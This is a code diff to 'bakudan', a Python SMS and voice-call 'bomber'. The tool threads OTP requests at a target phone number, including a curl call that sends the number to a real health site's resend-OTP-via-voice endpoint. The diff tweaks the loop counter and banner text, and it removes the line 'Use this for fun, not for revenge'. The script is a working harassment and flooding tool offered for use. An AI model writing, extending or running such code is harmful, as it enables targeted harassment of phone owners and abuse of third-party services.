@@ -18,7 +18,8 @@ except ImportError:
     print('[!] Error: some dependencies are not installed')
     print('Type \'pip install -r requirements.txt\' to install all required packages')
     exit()
-country_codes = { '93': 'AF',
+country_codes = { 
+    '93': 'AF',
     '355': 'AL',
     '213': 'DZ',
     '376': 'AD',
@@ -234,7 +235,7 @@ def banner():
     print()
 
 
-count_inf = 0
+count_inf = 50
 
 
 def infinite(pn, dl, ch, max):
@@ -254,7 +255,6 @@ def infinite(pn, dl, ch, max):
             continue
         os.system('rm proc.xxx >/dev/null 2>&1')
         count_inf += 1
-        # os.system('echo SpeedX >> count.xxx')
         time.sleep(float(dl))
         if (count_inf > maxlim):
             exit()
@@ -268,7 +268,7 @@ def checkinternet():
     except Exception:
         res = True
     if res:
-        print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies...")
+        print("\n\n\tYour Internet Speed is Slow or You Are Using Proxies...")
         print('\t\tbakudan Will Stop Now...\n\n')
         banner()
         exit()
@@ -376,6 +376,7 @@ def getapi(pn, lim, cc):
             'curl -s "https://www.myupchar.com/user_profile/resend_otp_via_voice?id=' + pn + '"').read()
         return rd.find("1") != -1
     return False
+
 
 
 def remsp(num):
@@ -581,20 +582,14 @@ if nm == 0:
         print('\tbakudan Shows Better Result in 10 to 25 Threads\n\t\tStill Continuing....')
     print("\n\nPlease Remember That This Is in Experimental Stage And Is Incredibly Fast...")
     t = [None] * nt
-    print("\n\n==================================================================")
-    print("                Gearing Up Bomber, please wait !!               ")
-    print("     Please keep your data connection active during bombing !!    ")
-    print("==================================================================")
+    print("\n\n==============================================================")
     print("             Target Number       : +91", pn)
-    print("             Number of Threads   : ", nt)
-    print("             Delay               : ", dl)
     print("==================================================================")
-    print("              Use this for fun, not for revenge !!                ")
     print("              This Bomber Was Created By m4zart !!                ")
     print("==================================================================")
     input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Start Bomber...\n')
     os.system('rm *.xxx* > /dev/null 2>&1')
-    print("\n\nStarting Bomb....")
+    print("\n\nstarting bakudan....")
     for i in range(nt):
         t[i] = threading.Thread(target=infinite, args=(pn, dl, ch, maxlim,))
         t[i].daemon = True
